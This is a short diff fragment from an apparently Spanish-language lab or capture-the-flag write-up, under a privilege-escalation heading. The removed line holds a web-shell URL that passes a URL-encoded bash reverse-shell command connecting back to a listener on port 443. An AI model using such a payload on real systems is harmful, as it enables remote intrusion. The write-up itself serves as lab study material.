@@ -38,4 +38,4 @@ previamente en escucha en el puerto 443
 
 ### ESCALAR PRIVILEGIOS
 
-http://172.17.0.1/shell.php?parameter=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/172.17.0.3/443%200%3E%261%22
+![alt text](image-6.png)
